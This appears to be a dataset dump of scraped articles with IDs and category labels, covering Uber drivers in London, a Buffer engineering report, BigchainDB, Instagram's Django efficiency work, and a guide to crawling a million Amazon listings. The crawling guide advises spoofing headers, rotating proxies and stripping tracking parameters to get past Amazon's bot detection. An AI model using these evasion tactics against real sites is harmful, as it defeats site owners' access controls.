there was something about Uber   the scale of its promise  the remorselessness of the platform   that alienated him as well   I guarantee you one thing   Miah told me   Uber don t see drivers as humans  I don t care what they tell you    I guarantee you one thing  Uber don t see drivers as humans  I don t care what they tell you Ruman Miah  Through Twitter  he made contact with James Farrar  an Irish former software consultant and activist  who started driving for Uber and has now become London s leading campaigner against the company  Last July  with the GMB  Farrar filed a lawsuit against Uber  arguing that the company should recognise its drivers as workers  and guarantee them minimum levels of pay and conditions  Farrar has also cofounded an organisation called United Private Hire Drivers association  to represent drivers in London  When I spent time with Miah earlier this year  he was deliberating  as he does  the merits of joining both initiatives  He was still driving for 20 or 30 hours a week on Uber  just to cover his costs  His rating had dropped to 4 7   From inside Uber  it can be hard to decode all the complaints  the anxieties  the general noise and disbelief about its plans  because disruption means exactly that  Lives change  There is pain  And we take Ubers  Three years ago  during the winter of 2012  there were 5 000 active riders in London  Now there are 1 7 million   around half the number of people who take the Tube each day  There is no shortage of drivers signing up  In the moment of its conquest  Uber only knows how to grow  The network only thickens   Facebook Twitter Pinterest Jo Bertram  a former McKinsey consultant who now runs Uber in Britain  Ireland and the Nordic countries  Photograph  Felix Clay for the Guardian  When we talked  Jo Bertram always sounded sympathetic enough to the need for lawsuits and protests and regulatory challenges to figure out the shape of the future that Uber is bringing  But she is also someone who has seen the numbers and knows that they are unarguable   Everything about Uber is very data driven and logical   she said   It is bringing that to a world where a lot of the arguments against are not necessarily  They are more on sentiment  It is almost like these two people arguing in very different languages    And then Bertram told me about UberPool  the next stage of the company s journey towards the Perpetual Trip  which launched in London three months ago  UberPool knits together riders  journeys so they can share cars  It is 25  cheaper than even UberX and  in significant ways  no longer resembles a taxi at all  since you share the car with strangers  Uber believes it is the product that could change the way we think about private car ownership  A recent Uber study in Paris concluded that taking UberPool for a year would be cheaper than owning a vehicle yourself  Parking spaces will become a thing of the past   UberPool is an amazingly new thing  which we think could have amazing potential for London   said Bertram   But it is incredibly complicated  It is asking for a leap of faith    Do we believe in Uber  A few days later  I went to the second meeting of United Private Hire Drivers  Farrar s nascent drivers  rights organisation  The group wants a cap on driver numbers in London  and is planning a series of pay protests against Uber  The meeting was in a community hall in Kentish Town  There were about 40 drivers there  Uber had recently cut its prices in Leeds and Manchester  and a few guys from those cities had come down  Everyone I spoke to got out the calculator on their phone  and wanted to show me their vanishing returns  A banner stuck to a table said   Enough is Enough   George Galloway  who is now a leftwing mayoral candidate  came and addressed the room   What does Uber give you except grief   he asked   Because we know what you give Uber  which are profits that are beyond the dreams of avarice   When Galloway left  I followed him out  Parked close around the hall  there were Toyota Priuses and Mercedes E Classes  their private hire stickers showing in their rear windscreens  I opened my app  The screen showed empty streets where those cars should have been  But I didn t have to worry  A vehicle came into view  My Uber was two minutes away     Follow the Long Read on Twitter at  gdnlongread  or sign up to the long read weekly email here,"[1086 1016 281 673 1300 952 778 1299 809 1295 1010]"
1090,training-dataset/product/673.txt,product,10 things I wish I knew as a UX research team of oneVoice is either a genius technology whose time has finally come  or the most overhyped waste of time,"[1090 778 714 1165 15 61 1373 234 731 683 588]"
1095,training-dataset/business/1341.txt,business,Firming the foundations of a faster  more reliable BufferRequests for buffer com 203 m  1 9   Avg  response for buffer com 265 ms  5 4   Requests for api bufferapp com 430 m  59 8    Avg  response for api bufferapp com 196 ms  100   Code reviews  given 63  of pull requests  3    We offloaded nearly 60  of requests to api bufferapp com onto the Kubernetes cluster with the new links service  The links service was heavily cached  which caused average response from api bufferapp com to appear artificially low   Buffer Kubernetes Cluster  9 nodes in cluster  in cluster 124 pods  660million requests handled  requests handled Serving 51  of total traffic  Bugs   Quality  3 S1  severity 1  bugs  20 opened  17 closed    8 5  smashed  1  up from than October   S1  severity 1  bugs  20 opened  17 closed    smashed  1  up from than October  11 S2  severity 2  bugs  33 opened  22 closed  66  smashed  2  down from than October   Latest Engineering productivity hack  Deep Work Wednesdays  We ve had our first full month in November of Deep Work Wednesdays  no meetings and minimal Slack use for our engineering and product team   Our Data team experimented with similar version of this idea with their two day Hackday event and that inspired our team to come up with a way to get some intensive work done throughout the quarter   It s been really refreshing and energizing to have a mid week day of calm zen focus where we can put our heads down and make like this cat   This is the first major step we ve taken experimenting actively with ways balance focus with collaboration and staying a tight knit team   There were a few interesting side effects  Having a day with most engineers off Slack meant we had to become more disciplined with our weekday On Call schedule for emergency responses  as we couldn t rely on folks being around Slack all day to spot trouble  Steven has gotten the team into a much clearer schedule of key people set up to receive and respond to emergency situations   Another interesting effect was that our product managers have been keen on joining in and teammates from all different walks of Buffer  from Happiness to Design  have been really interested in our little experiment and might try it out themselves  Perhaps this is a simple  scalable experiment you can try on your team  too   Let s make it snappy  Focusing on web performance  Federico has been leading a focus on performance in the Buffer dashboard to help ensure all actions in the dashboard are nice and snappy   These efforts are driven by the Task Performance Indicator framework which keeps the focus on the tasks our users are trying to do  and the performance of the code that executes these tasks  This way  Federico is able to make the highest impact optimizations for our customers   Mike also been exploring service workers to help speed up our regularly used static content  There are still some challenges around trying to keep static files fresh when we deploy multiple times a day   We ve explore some strategies  but haven t quite yet found a great solution  If you know of any great solutions to have a minimal user experience impact  it d be amazing if you shared in the comments   Business customers  Buffer s new way to manage your team   We re excited and proud that Hamish has rolled out the Organizational Admin  a new way for you to manage your Buffer for Business social media profiles and team mates  to 100 percent of our users   Look out for the prompts to set up your team as an organization   it s a much smoother flow that we hope will make life a lot easier for all our Buffer for Business customers   The rollout itself has been one of the smoothest to date   Well done  Hamish  for your excellent stewardship of the project  and to fellow crafters Alex  Dan and Jos   and Colin  for organizing and leading our first quality assurance  Stop and Hammer  drill   During a period of several days  Colin spearheaded a serious quality assurance push in which he  Tom  myself and any others on the team jumped in to try actively break the Organizations Admin  We were glad to kick up a few bugs and interesting scenarios before our users did  That drill was really key in making sure the final version was rock solid and the roll out the smoothest one we ve had yet   A brand new Android composer  Available now to all Android users  a brand new composer   The architecture was designed by Joe using the MVP framework with RXJava  and there are a lot of user interface and user flow improvements that make sharing on your Android device easier and faster   Marcus and Joe have released this big refactor of the Android Buffer update composer into the wild   A lot of hard work and thorough testing went into this major from the ground up rewrite of the Android composer   A GIF of our old composer is up above  and below you can see the new version  Hope you enjoy it   Coming up very soon are in app purchases for Android  which is now in the testing phase   we re really excited to allow folks to switch plans and upgrade right within the app  Joe and Marcus are also working on some super slick new UI improvements for the big version release of v 6 0 0  coming up in Google Play soon   This week  Andy will be heading to AsyncDisplayKit s 2 0 launch event at Pinterest   We re super interested to try the new Declarative API for Tables and Collections  which will allow us to remove a bunch of code throughout the app  We switched our image library code for Pinterest s PINRemoteImage as it s used throughout AsyncDisplayKit  so it made sense to make use of the single dependency it also allows us to improve Instagram Reposting speed using prefetching of images   Contribution Notifications are now available on iOS  If you have a 3D Touch enabled device  you can now use 3D Touch notifications to view a preview along with actions to Approve  Dismiss and Edit   We ve refactored the Settings view to make adding and removing options for specific profiles easier in future  For example  we re currently showing Touch ID for all devices even those without Touch ID capabilities   Continuing on our path to 99 9  crash free  the current iOS app version is at 99 85   We also released a sticker pack within Buffer which contains our Buffer Values as stickers  More stickers coming soon   Speaking at KubeCon on our transition to microservices  Dan gave a great talk at KubeCon on How Kubernetes Was the Secret Sauce in Our Globally Distributed Team s Transition to Microservices   KubeCon is an incredible conference and we re so excited that Dan flew the Buffer flag alongside technical leaders like Sam Ghods  cofounder of Box  and software architects from IMB  Comcast  Twitter  Microsoft  PayPal  Google   He brought back a lot of great learnings to the team  from the big picture future vision  Kubernetes becoming the operating system for clusters   to specifics like using Helm for package management and how to debug and find errors much faster by using Open Trace to trace the flow of a transaction across many services   We re all really proud of the work Dan as architect and our systems team Steven  Adnan and Eric have done to distinguish Buffer as an early adopter of Kubernetes for container orchestration   You can read more about how we planned for and took the plunge with a big re architecture here  This move to service oriented architecture will make development at Buffer faster and help Buffer run more reliably for our users than ever before   Harrison rebuilt our old Buffer links service  which tracks how many times a link has been shared and also powers our  Buffer buttons   to be its own service running on Kubernetes  You can read all about the dragons slayed and lessons learned along the way here   It was a big one to rebuild owing to the heavy load   in its first 15 hours of handling production traffic  it served 15 2 million requests   With the links service offloading a ton of traffic onto our Kubernetes cluster  we ve seen traffic served by the API down 56  in November   Currently we have 8 containers handling this load from the links service with a sub millisecond response times   this week s average was a blazing 0 764 milliseconds  We hope you enjoy those super fast shares   A Kubernetes dashboard for easier deployments  Adnan built a great dashboard  affectionately known as  Kuberdash   which makes it really easy to deploy a new service with a slack bot   Here s an example of Tigran setting up a deployment for an analytics microservice   you create the deployment in the dashboard and then it s really easy to deploy straight from Slack   Steve is now our first dedicated UI Developer  Steve started out as a product designer for Buffer  He s slowly transitioned to the engineering team  by taking on smaller tasks  working the marketing team and learning React in his spare time  Once we realized that Steve was on a fast track to becoming a full fledged engineer  we knew we had to jump at the opportunity to use his design background for even more impact  Luckily Steve also had this exact idea in mind   He s now in charge of working with the design   engineering teams to make sure our design systems are easy to use and he makes sure that we deliver on a very high bar of product polish for our product   Over to you  Is there anything you d love to learn more about  Anything we could share more of  We d love to hear from you in the comments   Check out more reports from November 2016,"[1095 1351 92 778 1336 61 520 234 830 1300 673]"
1096,training-dataset/business/378.txt,business,Jessica Livingston   How to Build the FutureThe interactive transcript could not be loaded   Rating is available when the video has been rented   This feature is not available right now  Please try again later,"[1096 689 722 99 707 1138 1300 92 778 1216 61]"
1101,training-dataset/engineering/856.txt,engineering,19 Lessons I Learned While Crawling 1MM  Product ListingsIn its simplest form  web scraping is about making requests and extracting data from the response  For a small web scraping project  your code can be simple  You just need to find a few patterns in the URLs and in the HTML response and you re in business   But everything changes when you re trying to pull over 1 000 000 products from the largest ecommerce website on the planet   When crawling a sufficiently large website  the actual web scraping  making requests and parsing HTML  becomes a very minor part of your program  Instead  you spend a lot of time figuring out how to keep the entire crawl running smoothly and efficiently   This was my first time doing a scrape of this magnitude  I made some mistakes along the way  and learned a lot in the process  It took several days  and quite a few false starts  to finally crawl the millionth product  If I had to do it again  knowing what I now know  it would take just a few hours   In this article  I ll walk you through the high level challenges of pulling off a crawl like this  and then run through all of the lessons I learned  At the end  I ll show you the code I used to successfully pull 1MM  items from amazon com   I ve broken it up as follows   High Level Challenges I Ran Into  There were a few challenges I ran into that you ll see on any large scale crawl of more than a few hundred pages  These apply to crawling any site or running a sufficiently large crawling operation across multiple sites   High Performance is a Must  In a simple web scraping program  you make requests in a loop   one after the other  If a site takes 2 3 seconds to respond  then you re looking at making 20 30 requests a minute  At this rate  your crawler would have to run for a month  non stop before you made your millionth request   Not only is this very slow  it s also wasteful  The crawling machine is sitting there idly for those 2 3 seconds  waiting for the network to return before it can really do anything or start processing the next request  That s a lot of dead time and wasted resources   When thinking about crawling anything more than a few hundred pages  you really have to think about putting the pedal to the metal and pushing your program until it hits the bottleneck of some resources   most likely network or disk IO   I didn t need to do this for my purposeses  more later   but you can also think about ways to scale a single crawl across multiple machines  so that you can even start to push past single machine limits   Avoiding Bot Detection  Any site that has a vested interest in protecting its data will usually have some basic anti scraping measures in place  Amazon com is certainly no exception   You have to have a few strategies up your sleeve to make sure that individual HTTP requests   as well as the larger pattern of requests in general   don t appear to be coming from one centralized bot   For this crawl  I made sure to   Spoof headers to make requests seem to be coming from a browser  not a script Rotate IPs using a list of over 500 proxy servers I had access to Strip  tracking  query params from the URLs to remove identifiers linking requests together  More on all of these in a bit   The Crawler Needed to be Resilient  The crawler needs to be able to operate smoothly  even when faced with common issues like network errors or unexpected responses   You also need to be able to pause and continue the crawl  updating code along the way  without going back to  square one   This allows you to update parsing or crawling logic to fix small bugs  without needing to rescrape everything you did in the past few hours   I didn t have this functionality initially and I regretted it  wasting tons of hours hitting the same URLs again and again whenever I need to make updates to fix small bugs affecting only a few pages   Crawling At Scale Lessons Learned  From the simple beginnings to the hundreds of lines of python I ended up with  I learned a lot in the process of running this project  All of these mistakes cost me time in some fashion  and learning the lessons I present here will make your amazon com crawl much faster from start to finish   1  Do the Back of the Napkin Math  When I did a sample crawl to test my parsing logic  I used a simple loop and made requests one at a time  After 30 minutes  I had pulled down about 1000 items   Initially  I was pretty stoked   Yay  my crawler works   But when I turned it loose on a the full data set  I quickly realized it wasn t feasible to run the crawl like this at full scale   Doing the back of the napkin math  I realized I needed to be doing dozens of requests every second for the crawl to complete in a reasonable time  my goal was 4 hours    This required me to go back to the drawing board   2  Performance is Key  Need to be Multi Threaded  In order to speed things up and not wait for each request  you ll need to make your crawler multi threaded  This allows the CPU to stay busy working on one response or another  even when each request is taking several seconds to complete   You can t rely on single threaded  network blocking operations if you re trying to do things quickly  I was able to get 200 threads running concurrently on my crawling machine  giving me a 200x speed improvement without hitting any resource bottlenecks   3  Know Your Bottlenecks  You need to keep an eye on the four key resources of your crawling machine  CPU  memory  disk IO and network IO  and make sure you know which one you re bumping up against   What is keeping your program from making 1MM requests all at once   The most likely resource you ll use up is your network IO   the machine simply won t be capable of writing to the network  making HTTP requests  or reading from the network  getting responses  fast enough  and this is what your program will be limited by   Note that it ll likely take hundreds of simultaneous requests before you get to this point  You should look at performance metrics before you assume your program is being limited by the network   Depending on the size of your average requests and how complex your parsing logic  you also could run into CPU  memory or disk IO as a bottleneck   You also might find bottlenecks before you hit any resource limits  like if your crawler gets blocked or throttled for making requests too quickly   This can be avoided by properly disguising your request patterns  as I discuss below   4  Use the Cloud  I used a single beefy EC2 cloud server from Amazon to run the crawl  This allowed me to spin up a very high performance machine that I could use for a few hours at a time  without spending a ton of money   It also meant that the crawl wasn t running from my computer  burning my laptop s resources and my local ISP s network pipes   5  Don t Forget About Your Instances  The day after I completed the crawl  I woke up and realized I had left an m4 10xlarge running idly overnight  My reaction   I probably wasted an extra  50 in EC2 fees for no reason  Make sure you stop your instances when you re done with them   6  Use a Proxy Service  This one is a bit of a no brainer  since 1MM requests all coming from the same IP will definitely look suspicious to a site like amazon that can track crawlers   I ve found that it s much easier  and cheaper  to let someone else orchestrate all of the proxy server setup and maintenance for hundreds of machines  instead of doing it yourself   This allowed me to use one high performance EC2 server for orchestration  and then rent bandwidth on hundreds of other machines for proxying out the requests   I used ProxyBonanza and found it to be quick and simple to get access to hundreds of machines   7  Don t Keep Much in Runtime Memory  If you keep big lists or dictionaries in memory  you re asking for trouble  What happens when you accidentally hit Ctrl C when 3 hours into the scrape  as I did at one point   Back to the beginning for you   Make sure that the important progress information is stored somewhere more permanent   8  Use a Database for Storing Product Information  Store each product that you crawl as a row in a database table  Definitely don t keep them floating in memory or try to write them to a file yourself   Databases will let you perform basic querying  exporting and deduping  and they also have lots of other great features  Just get in a good habit of using them for storing your crawl s data   9  Use Redis for Storing a Queue of URLs to Scrape  Store the  frontier  of URLs that you re waiting to crawl in an in memory cache like redis  This allows you to pause and continue your crawl without losing your place   If the cache is accessible over the network  it also allows you to spin up multiple crawling machines and have them all pulling from the same backlog of URLs to crawl   10  Log to a File  Not stdout  While it s temptingly easy to simply print all of your output to the console via stdout  it s much better to pipe everything into a log file  You can still view the log lines coming in  in real time by running tail  f on the logfile   Having the logs stored in a file makes it much easier to go back and look for issues  You can log things like network errors  missing data or other exceptional conditions   I also found it helpful to log the current URL that was being crawled  so I could easily hop in  grab the current URL that was being crawled and see how deep it was in any category  I could also watch the logs fly by to get a sense of how fast requests were being made   11  Use screen to Manage the Crawl Process instead of your SSH Client  If you SSH into the server and start your crawler with python crawler py   what happens if the SSH connection closes  Maybe you close your laptop or the wifi connection drops  You don t want that process to get orphaned and potentially die   Using the built in Unix screen command allows you to disconnect from your crawling process without worrying that it ll go away  You can close your laptop and simple SSH back in later  reconnect to the screen  and you ll see your crawling process still humming along   12  Handle Exceptions Gracefully  You don t want to start your crawler  go work on other stuff for 3 hours and then come back  only to find that it crashed 5 minutes after you started it   Any time you run into an exceptional condition  simply log that it happened and continue  It makes sense to add exception handling around any code that interacts with the network or the HTML response   Be especially aware of non ascii characters breaking your logging   Site Specific Lessons I Learned About Amazon com  Every site presents its own web scraping challenges  Part of any project is getting to know which patterns you can leverage  and which ones to avoid   Here s what I found   13  Spoof Headers  Besides using proxies  the other classic obfuscation technique in web scraping is to spoof the headers of each request  For this crawl  I just grabbed the User Agent that my browser was sending as I visited the site   If you don t spoof the User Agent  you ll get a generic anti crawling response for every request Amazon   In my experience  there was no need to spoof other headers or keep track of session cookies  Just make a GET request to the right URL   through a proxy server   and spoof the User Agent and that s it   you re past their defenses   14  Strip Unnecessary Query Parameters from the URL  One thing I did out of an abundance of caution was to strip out unnecessary tracking parameters from the URL  I noticed that clicking around the site seemed to append random IDs to the URL that weren t necessary to load the product page   I was a bit worried that they could be used to tie requests to each other  even if they were coming from different machines  so I made sure my program stripped down URLs to only their core parts before making the request   15  Amazon s Pagination Doesn t Go Very Deep  While some categories of products claim to contain tens of thousands of items  Amazon will only let you page through about 400 pages per category   This is a common limit on many big sites  including Google search results  Humans don t usually click past the first few pages of results  so the sites don t bother to support that much pagination  It also means that going too deep into results can start to look a bit fishy   If you want to pull in more than a few thousand products per category  you need to start with a list of lots of smaller subcategories and paginate through each of those  But keep in mind that many products are listed in multiple subcategories  so there may be a lot of duplication to watch out for   16  Products Don t Have Unique URLs  The same product can live at many different URLs  even after you strip off tracking URL query params  To dedupe products  you ll have to use something more specific than the product URL   How to dedupe depends on your application  It s entirely possible for the exact same product to be sold by multiple sellers  You might look for ISBN or SKU for some kinds of products  or something like the primary product image URL or a hash of the primary image   17  Avoid Loading Detail Pages  This realization helped me make the crawler 10 12x faster  and much simpler  I realized that I could grab all of the product information I needed from the subcategory listing view  and didn t need to load the full URL to each of the products  detail page   I was able to grab 10 12 products with one request  including each of their titles  URLs  prices  ratings  categories and images   instead of needing to make a request to load each product s detail page separately   Whether you need to load the detail page to find more information like the description or related products will depend on your application  But if you can get by without it  you ll get a pretty nice performance improvement   18  Cloudfront has no Rate Limiting for Amazon com Product Images  While I was using a list of 500 proxy servers to request the product listing URLs  I wanted to avoid downloading the product images through the proxies since it would chew up all my bandwidth allocation   Fortunately  the product images are served using Amazon s CloudFront CDN  which doesn t appear to have any rate limiting  I was able to download over 100 000 images with no problems   until my EC2 instance ran out of disk space   Then I broke out the image downloading into its own little python script and simply had the crawler store the URL to the product s primary image  for later retrieval   19  Store Placeholder Values  There are lots of different types of product pages on Amazon  Even within one category  there can be several different styles of HTML markup on individual product pages  and it might take you a while to discover them all   If you re not able to find a piece of information in the page with the extractors you built  store a placeholder value like   No Image Detected   in your database   This allows you to periodically query for products with missing data  visit their product URLs in your browser and find the new patterns  Then you can pause your crawler  update the code and then start it back up again  recognizing the new pattern that you had initially missed   How My Finished  Final Code Works  TL DR  Here s a link to my code on github  It has a readme for getting you setup and started on your own amazon com crawler   Once you get the code downloaded  the libraries installed and the connection information stored in the settings file  you re ready to start running the crawler   If you run it with the  start  command  it looks at the list of category URLs you re interested in  and then goes through each of those to find all of the subcategory URLs that are listed on those page  since paginating through each category is limited  see lesson  15  above    It puts all of those subcategory URLs into a redis queue  and then spins up a number of threads  based on settings max_threads   to process the subcategory URLs  Each thread pops a subcategory URL off the queue  visits it  pulls in the information about the 10 12 products on the page  and then puts the  next page  URL back into the queue   The process continues until the queue is empty or settings max_requests has been reached   Note that the crawler does not currently visit each individual product page since I didn t need anything that wasn t visible on the subcategory listing pages  but you could easily add another queue for those URLs and a new function for processing those pages   Hope that helps you get a better sense of how you can conduct a large scrape of amazon com or a similar ecommerce website   If you re interested in learning more about web scraping  I have an online course that covers the basics and teaches you how to get your own web scrapers running in 15 minutes,"[1101 778 298 1351 1373 683 92 234 1336 673 520]"
1106,training-dataset/engineering/934.txt,engineering,How to use blockchain to build a database solutionFirst Wall Street  then the database world  While most people are still trying to wrap their heads around blockchain and its difference from Bitcoin  others are using it in a wide range of domains  Is it hype  a case of having a hammer and seeing problems as nails  or could blockchain actually have a purpose in the database world   BigchainDB s creators argue there is a reason  and a way  for blockchain and databases to live happily ever after   What  Blockchain  Over hyped bandwagon or truly revolutionary technology  Silicon Valley is hot on blockchain    the technology behind the Bitcoin cryptocurrency    and its many potrential uses Blockchain s economic impact could be as important as the Internet Read More  Blockchain was introduced by Bitcoin  which despite its oft discussed issues has illustrated a novel set of benefits  decentralized control  where  no one  owns or controls the network  immutability  where written data is  forever  tamper resistant  and the ability to create and transfer assets on the network  without reliance on a central entity   The initial excitement surrounding Bitcoin stemmed from its use as a token of value  for example as an alternative to government issued currencies  Now the separation between Bitcoin and the underlying blockchain technology is getting better understood  the scope of the technology itself and its applications are being extended   With this increase in scope  single monolithic blockchain technologies are being re framed into building blocks at four levels of the stack   1  Applications  2  Decentralized  blockchain  computing platforms  3  Decentralized processing  smart contracts  and decentralized storage  file systems  databases  and communication  4  Cryptographic primitives  consensus protocols  and other algorithms   Blockchain operations work with data  and that data is also stored as part of the blockchain  For example  when transferring assets from one node to another  the amounts transferred as well as the sender  receiver  and time of transfer are stored  So the option to leverage the benefits blockchain brings by using it as a database is tempting   Why  The problem is  the blockchain as a database is awful  measured by traditional database standards  throughput is just a few transactions per second  tps   latency before a single confirmed write is 10 minutes  and capacity is a few dozen GB  Furthermore  adding nodes causes more problems  with a doubling of nodes  network traffic quadruples with no improvement in throughput  latency  or capacity  Plus  the blockchain essentially has no querying abilities   How could that possibly ever work  Trent McConaghy and his co founders in BigchainDB have tackled this issue by turning it on its head  instead of using blockchain as a database  they are taking a database and adding blockchain features to it  Initially they started working with RethinkDB  the reason being that RethinkDB leveraged a clean and efficient node update protocol   Under the hood  BigchainDB utilizes two distributed databases  S  transaction set or  backlog   and C  blockchain   connected by the BigchainDB Consensus Algorithm  BCA   The BCA runs on each signing node  with signing nodes forming a federation  Non signing clients may connect to BigchainDB  and depending on permissions they may be able to read  issue assets  transfer assets  and more   Each of the distributed DBs  S and C  is an off the shelf big data DB  BigchainDB does not interfere with their internal workings  so it gets to leverage their scalability properties  as well as features like revision control and benefits like battle tested code  Each DB is running its own internal consensus algorithm for consistency   How  At this point BigchainDB has moved towards using MongoDB  and is in fact in a partnership with them  But why MongoDB  It could have been any other open source distributed database   We did consider a number of DBs  but we wanted a document DB to begin with as we re working with JSON at this point  and MongoDB is an obvious choice    But  again  isn t BigchainDB afraid that combining the notorious blockchain with the recently targeted MongoDB could raise multiple red flags in terms of security  McConaghy has openly acknowledged that the underlying DB may be a security vulnerability at this point  but is neither critical of MongoDB nor apologetic    MongoDB has been clear about providing ease of access by removing hard security  so it s not their fault if people left their installations on the internet unsecured  As for us  at this point we are no better or worse than a centralized solution  and we will definitely add improved security features before moving to production   he says   BigchainDB works by offering an API on top of the underlying database  with the aim of acting as a substrate agnostic layer that adds the key blockchain features of decentralization  immutability  and asset transferability  But that leads to some interesting issues   Read this MongoDB chief  Why the clock s ticking for relational databases Even though it may be the wrong tool for the job  the years of development behind the relational database ensure its popularity   for the moment  says MongoDB s Max Schireson  Read More  For example  what if for some reason users would like to use a different database as a substrate  BigchainDB offers a Service Provider Interface that can be used to plug in other databases  It is what has been used to integrate and operate on top of MongoDB  and according to McConaghy could also be used to do the same with any other database  be it relational or key store or anything else   Of course  that is easier said than done  and brings up another issue  querying  Although BigchainDB s querying support is not fully operational at this point  the goal is to offer one unified querying interface over whatever underlying database nodes BigchainDB may be using  That is a hard problem to solve  as not all databases have the same query languages or capabilities   However  the current trend towards feature convergence in the database world  and in particular the renewed interest and turn to SQL as the standard for querying may offer a way out of this  Even so called NoSQL databases like MongoDB offer SQL capabilities these days  so this is the most promising way forward for BigchainDB as well  a SQL interface   At this point  BigchainDB queries are mostly done by directly using MongoDB s API  but this is a sort of hack that tightly couples BigchainDB to MongoDB  so it is seen as an interim solution that will eventually give way to querying via BigchainDB s own API   Who  As should be evident by now  BigchainDB is not a typical database by any measure  It is also not a typical startup run by a typical founder  McConaghy has a rich background in AI before it was cool and a hacker ethos   doing AI in the 90s was one of the least popular things one could possibly do  so I certainly didn t do it for the hype    McConaghy could have been part of the Facebooks of the world had he chosen to  as he has actually turned down such offers  This is not what drives him  and by extension BigchainDB  The drive behind BigchainDB is not getting to a successful exit or IPO  but rather reshaping the internet and the world at large   McConaghy believes that centralization leads to concentration of power  citing examples such as social media ownership and control of data or the conundrum that both creators and consumers of art  and content in general  face on the internet   This is what McConaghy s previous venture  Ascribe  was about  helping digital artists transfer ownership of their work to customers  Although whether this is really applicable to everyday art like music or videos is unclear  Ascribe aims to provide a solution for digital artists with unique creations and collectors that want to own them  and uses decentralization to achieve this  At some point Ascribe s evolution gave birth to BigchainDB   Some might say this is an overly complicated solution  but McConaghy is not one to shy away from complexity  When asked on his take on Numerai and the criticism that has been expressed towards it for example  he is adamant   I don t think it s overly complicated  on the contrary  I think it s brilliant  maybe the best combination of blockchain and AI out there  I think they are doing a really good job of aligning incentives for founders  employees and users  Think of Facebook  what if it operated on the basis of giving its users a stake in the value it generates  This is what Numerai is doing  and in the process it is bringing a shift in the power structure and creating incentives for cooperation  So it is turning a zero sum game to a positive sum game    Where  So where on that long and winding road is BigchainDB at the moment  Berlin based BigchainDB has raised a total of 5 million euros  with a recent series A of 3 million  It is working in close collaboration with a number of early adopter clients  including the likes of RWE and Internet Archive   The Internet Archive  along other organizations such as Open Media or the Human Data Commons Foundation  are also the caretakers of IPDB  or Inter Planetary DB  a public instance of BigchainDB  used to collectively store and manage content in a safe and decentralized way  IPDB has an equally grand vision  its goal is to be a database for the internet   For Internet Archive for example  it would mean moving away from traditional storage technology and towards the decentralized and cooperative storage model that BigchainDB stands for  As Internet Archive is looking into options such as moving its data to Canada to avoid data sovereignty issues  the potential of adding immutability on top of decentralized storage is appealing   For RWE on the other hand  the stakes are a bit different  Traditionally  large electric utilities would connect the energy producers with the energy consumers  Deregulation changes things  as anyone can now connect to anyone  RWE is getting in front of that by exploring several blockchain projects  such as energy exchanges  electric car charging  and billing   BigchainDB has recently released version 0 9  and its roadmap for 2017 is to reach a stable version 1 0 in the summer and to have fully operational  production ready open source and enterprise versions available by the end of the year   Whether that goal is feasible  or whether its grand vision is likely to be achieved remains to be seen  It certainly does not lack in ambition or skills however   Addendum  March 8th 2017  After the article was published  we received the following clarification from Bigchain s CEO regarding scalability    When we first released BigchainDB  we gave too strong of an impression that it was  already  doing 1M writes s whereas that was actually just in the underlying database  RethinkDB at the time   though we had designed the algorithm such that BigchainDB could eventually hit that  after more hardening and optimizations    After feedback  we revised things to set a more appropriate expectation   towards  1M writes s  And we also discovered that users didn t care as much about that benefit compared to other benefits  like high capacity and usability  so we spent more of our resources towards user asks than towards 1M writes s so far   That is however still in the roadmap  it s just not a priority    I wrote a blog post last May describing this journey  including an apology for setting the wrong expectations  and a commitment to be better about it  which I m proud to say we ve kept  It was the first time in my career that I d had misaligned expectations compared to what I was shipping  never again       Digital Transformation  a CXO s Guide,"[1106 1299 424 699 946 373 1351 1295 1336 778 1373]"
1117,training-dataset/engineering/1313.txt,engineering,Web Service Efficiency at Instagram with Python   Instagram EngineeringWeb Service Efficiency at Instagram with Python  Instagram currently features the world s largest deployment of the Django web framework  which is written entirely in Python  We initially chose to use Python because of its reputation for simplicity and practicality  which aligns well with our philosophy of  do the simple thing first   But simplicity can come with a tradeoff  efficiency  Instagram has doubled in size over the last two years and recently crossed 500 million users  so there is a strong need to maximize web service efficiency so that our platform can continue to scale smoothly  In the past year we ve made our efficiency program a priority  and over the last six months we ve been able to maintain our user growth without adding new capacity to our Django tiers  In this post  we ll share some of the tools we built and how we use them to optimize our daily deployment flow   Why Efficiency   Instagram  like all software  is limited by physical constraints like servers and datacenter power  With these constraints in mind  there are two main goals we want to achieve with our efficiency program   Instagram should be able to serve traffic normally with continuous code rollouts in the case of lost capacity in one data center region  due to natural disaster  regional network issues  etc  Instagram should be able to freely roll out new products and features without being blocked by capacity   To meet these goals  we realized we needed to persistently monitor our system and battle regression   Defining Efficiency  Web services are usually bottlenecked by available CPU time on each server  Efficiency in this context means using the same amount of CPU resources to do more work  a k a  processing more user requests per second  RPS   As we look for ways to optimize  our first challenge is trying to quantify our current efficiency  Up to this point  we were approximating efficiency using  Average CPU time per requests   but there were two inherent limitations to using this metric   Diversity of devices  Using CPU time for measuring CPU resources is not ideal because it is affected by both CPU models and CPU loads  Request impacts data  Measuring CPU resource per request is not ideal because adding and removing light or heavy requests would also impact the efficiency metric using the per requests measurement   Compared to CPU time  CPU instruction is a better metric  as it reports the same numbers regardless of CPU models and CPU loads for the same request  Instead of linking all our data to each user request  we chose to use a  per active user  metric  We eventually landed on measuring efficiency by using  CPU instruction per active user during peak minute   With our new metric established  our next step was to learn more about our regressions by profiling Django   Profiling the Django Service  There are two major questions we want to answer by profiling our Django web service   Does a CPU regression happen  What causes the CPU regression and how do we fix it   To answer the first question  we need to track the CPU instruction per active user metric  If this metric increases  we know a CPU regression has occurred   The tool we built for this purpose is called Dynostats  Dynostats utilizes Django middleware to sample user requests by a certain rate  recording key efficiency and performance metrics such as the total CPU instructions  end to end requests latency  time spent on accessing memcache and database services  etc  On the other hand  each request has multiple metadata that we can use for aggregation  such as the endpoint name  the HTTP return code of the request  the server name that serves this request  and the latest commit hash on the request  Having two aspects for a single request record is especially powerful because we can slice and dice on various dimensions that help us narrow down the cause of any CPU regression  For example  we can aggregate all requests by their endpoint names as shown in the time series chart below  where it is very obvious to spot if any regression happens on a specific endpoint   CPU instructions matter for measuring efficiency   and they re also the hardest to get  Python does not have common libraries that support direct access to the CPU hardware counters  CPU hardware counters are the CPU registers that can be programmed to measure performance metrics  such as CPU instructions   Linux kernel  on the other hand  provides the perf_event_open system call  Bridging through Python ctypes enables us to call the syscall function in standard C library  which also provides C compatible data types for programming the hardware counters and reading data from them     With Dynostats  we can already find CPU regressions and dig into the cause of the CPU regression  such as which endpoint gets impacted most  who committed the changes that actually cause the CPU regression  etc  However  when a developer is notified that their changes have caused a CPU regression  they usually have a hard time finding the problem  If it was obvious  the regression probably 